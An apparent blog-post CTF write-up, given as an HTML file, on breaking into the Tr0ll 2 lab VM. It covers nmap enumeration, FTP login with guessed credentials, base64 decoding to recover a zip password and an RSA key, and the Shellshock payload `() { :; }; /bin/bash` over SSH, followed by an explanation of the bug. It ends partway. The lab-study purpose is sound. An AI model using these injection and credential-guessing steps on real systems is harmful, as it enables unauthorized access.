@@ -1,0 +1,1017 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Tr0ll 2 - There be trolls - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Tr0ll 2 writeup">
+  <meta name="keywords" content="troll 2, tr0ll 2, shellshock, troll 2 walkthrough, tr0ll 2 walkthrough, troll 2 solution, tr0ll 2 solution, troll 2 writeup, tr0ll 2 writeup, troll 2 vulnhub, tr0ll 2 vulnhub, troll 2 boot2root, tr0ll 2 boot2root, pentesting, ctf, pentest lab">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Tr0ll 2 - There be trolls</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-06-06T08:58:25-04:00" pubdate data-updated="true">Jun 6<span>th</span>, 2017</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>
+
+<!-- more -->
+
+
+<p>First, a bit of enumeration:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+</span><span class='line'>                                                                               
+</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
+</span><span class='line'> _____________________________________________________________________________
+</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+</span><span class='line'> -----------------------------------------------------------------------------
+</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor              
+</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor              
+</span><span class='line'> 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor              
+</span><span class='line'> 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor   </span></code></pre></td></tr></table></div></figure>
+
+
+<p>The IP we want is 192.168.217.129.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- -sV -T4 192.168.217.129
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-30 10:27 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.129
+</span><span class='line'>Host is up (0.000088s latency).
+</span><span class='line'>Not shown: 65532 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>21/tcp open  ftp     vsftpd 2.0.8 or later
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+</span><span class='line'>MAC Address: 00:0C:29:CB:3D:2E (VMware)
+</span><span class='line'>Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You know the drill! Something awaits us on that web server!</p>
+
+<p><img class="center" src="/images/pentest/tr0ll2/troll.png" title="troll" alt="troll"></p>
+
+<p>And a comment in the source:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--Nothing here, Try Harder!&gt;</span>
+</span><span class='line'><span class="c">&lt;!--Author: Tr0ll&gt;</span>
+</span><span class='line'><span class="c">&lt;!--Editor: VIM&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>User-agent:*
+</span><span class='line'>Disallow:
+</span><span class='line'>/noob
+</span><span class='line'>/nope
+</span><span class='line'>/try_harder
+</span><span class='line'>/keep_trying
+</span><span class='line'>/isnt_this_annoying
+</span><span class='line'>/nothing_here
+</span><span class='line'>/404
+</span><span class='line'>/LOL_at_the_last_one
+</span><span class='line'>/trolling_is_fun
+</span><span class='line'>/zomg_is_this_it
+</span><span class='line'>/you_found_me
+</span><span class='line'>/I_know_this_sucks
+</span><span class='line'>/You_could_give_up
+</span><span class='line'>/dont_bother
+</span><span class='line'>/will_it_ever_end
+</span><span class='line'>/I_hope_you_scripted_this
+</span><span class='line'>/ok_this_is_it
+</span><span class='line'>/stop_whining
+</span><span class='line'>/why_are_you_still_looking
+</span><span class='line'>/just_quit
+</span><span class='line'>/seriously_stop
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>
+
+<p><img class="center" src="/images/pentest/tr0ll2/noob.png" title="noob" alt="noob"></p>
+
+<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>ftp 192.168.217.129
+</span><span class='line'>Connected to 192.168.217.129.
+</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+</span><span class='line'>Name (192.168.217.129:root): Tr0ll
+</span><span class='line'>331 Please specify the password.
+</span><span class='line'>Password:
+</span><span class='line'>230 Login successful.
+</span><span class='line'>Remote system type is UNIX.
+</span><span class='line'>Using binary mode to transfer files.
+</span><span class='line'>ftp&gt; dir
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
+</span><span class='line'>226 Directory send OK.
+</span><span class='line'>ftp&gt; get lmao.zip
+</span><span class='line'>local: lmao.zip remote: lmao.zip
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+</span><span class='line'>226 Transfer complete.
+</span><span class='line'>1474 bytes received in 0.00 secs (8.4682 MB/s)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>
+
+<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>ls -l
+</span><span class='line'>total 68
+</span><span class='line'>-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
+</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
+</span><span class='line'>-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
+</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
+</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>Look Deep within y0ur_self for the answer
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>wc -l answer.txt
+</span><span class='line'>99157 answer.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>grep -r &quot;_&quot; decoded.txt
+</span><span class='line'>noooob_lol
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>wc -L decoded.txt
+</span><span class='line'>30 decoded.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">argparse</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">desc</span> <span class="o">=</span> <span class="s">&quot;Find and print lines from a file that are a certain length&quot;</span>
+</span><span class='line'><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="n">desc</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># length argument</span>
+</span><span class='line'><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+</span><span class='line'>    <span class="s">&#39;-l&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">help</span> <span class="o">=</span> <span class="s">&#39;Length value&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">dest</span> <span class="o">=</span> <span class="s">&#39;length&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nb">type</span> <span class="o">=</span> <span class="nb">int</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">required</span><span class="o">=</span><span class="bp">True</span>
+</span><span class='line'><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># file add_argument</span>
+</span><span class='line'><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+</span><span class='line'>    <span class="s">&#39;-f&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">help</span> <span class="o">=</span> <span class="s">&#39;Filename&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">dest</span> <span class="o">=</span> <span class="s">&#39;filename&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nb">type</span> <span class="o">=</span> <span class="nb">str</span><span class="p">,</span>
+</span><span class='line'>    <span class="n">required</span><span class="o">=</span><span class="bp">True</span>
+</span><span class='line'><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">filename</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+</span><span class='line'>      <span class="c"># strip the newline character for accurate counting</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">))</span> <span class="o">==</span> <span class="n">args</span><span class="o">.</span><span class="n">length</span><span class="p">:</span>
+</span><span class='line'>          <span class="k">print</span> <span class="n">line</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ran it and BOOM:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">line_length</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">l</span> <span class="mi">30</span> <span class="o">-</span><span class="n">f</span> <span class="n">decoded</span><span class="o">.</span><span class="n">txt</span>
+</span><span class='line'><span class="n">ItCantReallyBeThisEasyRightLOL</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">unzip</span> <span class="n">lmao</span><span class="o">.</span><span class="n">zip</span>
+</span><span class='line'><span class="n">Archive</span><span class="p">:</span>  <span class="n">lmao</span><span class="o">.</span><span class="n">zip</span>
+</span><span class='line'><span class="p">[</span><span class="n">lmao</span><span class="o">.</span><span class="n">zip</span><span class="p">]</span> <span class="n">noob</span> <span class="n">password</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">inflating</span><span class="p">:</span> <span class="n">noob</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It looks like it&rsquo;s a private key:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">file</span> <span class="n">noob</span>
+</span><span class='line'><span class="n">noob</span><span class="p">:</span> <span class="n">PEM</span> <span class="n">RSA</span> <span class="n">private</span> <span class="n">key</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried SSH&#8217;ing as noob this time:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span>
+</span><span class='line'><span class="n">TRY</span> <span class="n">HARDER</span> <span class="n">LOL</span><span class="err">!</span>
+</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>
+
+<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span> <span class="o">-</span><span class="n">t</span> <span class="s">&quot;() { :; }; pwd&quot;</span>
+</span><span class='line'><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">noob</span>
+</span><span class='line'><span class="n">TRY</span> <span class="n">HARDER</span> <span class="n">LOL</span><span class="err">!</span>
+</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span> <span class="o">-</span><span class="n">t</span> <span class="s">&quot;() { :; }; /bin/bash&quot;</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
+</span><span class='line'><span class="n">Linux</span> <span class="n">Tr0ll2</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">29</span><span class="o">-</span><span class="n">generic</span><span class="o">-</span><span class="n">pae</span> <span class="c">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>
+
+<h3>Shellshock explained</h3>
+
+<p>Because Bash is a scripting language, you can do things like defining functions:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">myfunction</span><span class="p">()</span> <span class="p">{</span> <span class="n">echo</span> <span class="s">&quot;I am a function&quot;</span><span class="p">;</span> <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And then you call it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">myfunction</span>
+</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">function</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="o">-</span><span class="n">f</span> <span class="n">myfunction</span>
+</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">env</span>
+</span><span class='line'><span class="p">[</span><span class="o">...</span><span class="p">]</span>
+</span><span class='line'><span class="n">myfunction</span><span class="o">=</span><span class="p">()</span> <span class="p">{</span>  <span class="n">echo</span> <span class="s">&quot;I am a function&quot;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="n">myfunction</span>
+</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">function</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">export</span> <span class="n">shocking</span><span class="o">=</span><span class="s">&#39;() { echo &quot;This is safe&quot; ; }; echo &quot;This is NOT safe&quot;&#39;</span>
+</span><span class='line'><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="n">shocking</span>
+</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">NOT</span> <span class="n">safe</span>
+</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">safe</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>
+
+<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>
+
+<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>
+
+<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
